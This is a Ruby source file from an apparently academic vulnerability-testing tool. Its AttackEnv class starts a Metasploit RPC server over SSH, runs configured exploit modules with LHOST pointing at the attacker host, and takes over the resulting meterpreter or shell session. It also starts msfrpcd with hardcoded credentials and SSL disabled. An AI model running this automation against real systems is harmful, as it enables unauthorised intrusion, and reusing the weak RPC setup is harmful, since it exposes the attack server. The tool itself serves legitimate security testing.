# Copyright [2020] [University of Aizu]
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

require 'bundler/setup'
require 'net/ssh'
require 'tty-prompt'

require './lib/attack/method/haijack'
require './lib/attack/tools/metasploit'
require './lib/ui'

class AttackEnv
  attr_reader :msf_api, :host, :user, :attack_vector
  attr_accessor :error

  include Haijack

  def initialize(args)
    @host = args[:attack_host]
    @user = {}
    @user[:name] = args[:attack_user]
    @user[:passwd] = args[:attack_passwd]

    @attack_vector = args[:attack_vector]
    start_up_msfserver if attack_vector == 'remote'

    @msf_api = Metasploit.new(host)
    msf_api.auth_login
    msf_api.console_create

    @error = { flag: false, module_name: nil, module_option: {} }
  end

  def execute_attack?(msf_modules)
    VultestUI.execute('Exploit attack')
    msf_modules.each do |msf_module|
      msf_module_option = {}
      msf_module['options'].each { |option| msf_module_option[option['name']] = option['var'] }
      msf_module_option['LHOST'] = host
      msf_module_info = msf_api.module_execute(type: msf_module['module_type'], name: msf_module['module_name'], option: msf_module_option)

      next if success_of_attack_module?(msf_module['module_name'], msf_module_info)

      error[:flag] = true
      error[:module_name] = msf_module['module_name']
      error[:module_option] = msf_module_option
      return false
    end
    return true
  end

  def rob_shell
    VultestUI.execute('Brake into target machine')

    session = { type: nil, id: nil }

    msf_api.module_session_list.each do |key, value|
      session[:id] = key if value['type'] == 'meterpreter' || value['type'] == 'shell'
      session[:type] = value['type'] unless session[:id] .nil?
    end
    return if session[:id].nil?

    case session[:type]
    when 'meterpreter' then meterpreter(api: msf_api, id: session[:id])
    when 'shell' then shell(api: msf_api, id: session[:id])
    end
  end

  private

  def success_of_attack_module?(module_name, module_info)
    VultestUI.tty_spinner_begin(module_name)
    continue_flag = true
    success_flag = false
    time_count = 0

    while continue_flag
      sleep(1)
      time_count += 1
      unless msf_api.module_session_list.empty?
        msf_api.module_session_list.each do |_key, value|
          # When module is auxiliary/scanner/ssh/ssh_login, module_info['uuid'] != value['exploit_uuid']
          success_flag = true if module_info['uuid'] == value['exploit_uuid'] || value['via_exploit'] == module_name
        end
      end
      break if success_flag

      next unless (time_count % 30).zero?

      VultestUI.tty_spinner_end('error')
      continue_flag = TTY::Prompt.new.yes?('There\'s a possibility that attack is fail. Are you still going to continue that?')
      VultestUI.tty_spinner_begin(module_name)
    end

    success_flag ? VultestUI.tty_spinner_end('success') : VultestUI.tty_spinner_end('error')
    success_flag
  end

  def start_up_msfserver
    begin
      VultestUI.tty_spinner_begin('Metasploit server')
      Net::SSH.start(host, user[:name], password: user[:passwd]) do |ssh|
        ssh.exec!("msfrpcd -a #{host} -p 55553 -U msf -P metasploit -S false \>/dev/null 2>&1")
        ssh.exec!("msfrpcd -a #{host} -p 55553 -U msf -P metasploit -S false")
      end
    rescue StandardError
      VultestUI.tty_spinner_end('error')
      VultestUI.warring('Run your attack machine now')

      TTY::Prompt.new.keypress(' If it is running now, puress ENTER key', keys: [:return])
      retry
    end
    VultestUI.tty_spinner_end('success')
  end
end
